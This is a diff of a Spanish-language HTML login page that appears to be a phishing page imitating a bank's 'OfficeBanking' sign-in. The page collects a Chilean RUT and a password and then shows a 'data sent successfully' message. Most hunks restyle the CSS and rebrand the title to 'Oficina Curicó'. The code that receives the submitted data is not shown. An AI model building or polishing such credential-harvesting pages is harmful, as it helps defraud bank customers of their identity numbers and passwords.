@@ -3,55 +3,58 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>OfficeBanking - Ingreso Seguro</title>
+  <title>Ingreso Seguro - Oficina Curicó</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      background-color: #f2f5f8;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f2f5f7;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
 
-    .formulario {
+    .contenedor {
       background-color: #fff;
-      padding: 30px;
+      padding: 30px 25px;
       border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
       width: 100%;
-      max-width: 380px;
+      max-width: 400px;
     }
 
-    .formulario h2 {
+    .contenedor h2 {
       text-align: center;
-      color: #0072bb;
       margin-bottom: 20px;
+      color: #0275d8;
     }
 
-    .formulario input {
+    input[type="text"], input[type="password"] {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccd1d9;
-      border-radius: 5px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
       font-size: 16px;
+      box-sizing: border-box;
     }
 
-    .formulario button {
+    button {
       width: 100%;
       padding: 12px;
-      background-color: #0072bb;
+      background-color: #0275d8;
       color: white;
-      border: none;
-      border-radius: 5px;
       font-size: 16px;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
+      margin-top: 10px;
     }
 
-    .formulario button:disabled {
-      background-color: #88bde0;
+    button:disabled {
+      background-color: #99c4eb;
       cursor: not-allowed;
     }
 
@@ -61,19 +64,25 @@
       display: none;
     }
 
-    #cargando { color: #777; }
-    #mensaje { color: green; }
+    #cargando {
+      color: #555;
+    }
+
+    #mensaje {
+      color: green;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-  <div class="formulario">
-    <h2>Acceso Seguro</h2>
+  <div class="contenedor">
+    <h2>Accede a tu cuenta</h2>
     <form id="formulario">
-      <input type="text" name="rut" placeholder="Ingresa tu RUT" required />
-      <input type="password" name="clave" placeholder="Ingresa tu Clave" required />
+      <input type="text" name="rut" placeholder="RUT" required />
+      <input type="password" name="clave" placeholder="Clave" required />
       <button type="submit">Ingresar</button>
       <div id="cargando">CARGANDO...</div>
-      <div id="mensaje">¡Enviado correctamente!</div>
+      <div id="mensaje">Datos enviados correctamente</div>
     </form>
   </div>
 
@@ -82,7 +91,7 @@
     const cargando = document.getElementById("cargando");
     const mensaje = document.getElementById("mensaje");
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("submit", function(e) {
       e.preventDefault();
       cargando.style.display = "block";
       mensaje.style.display = "none";
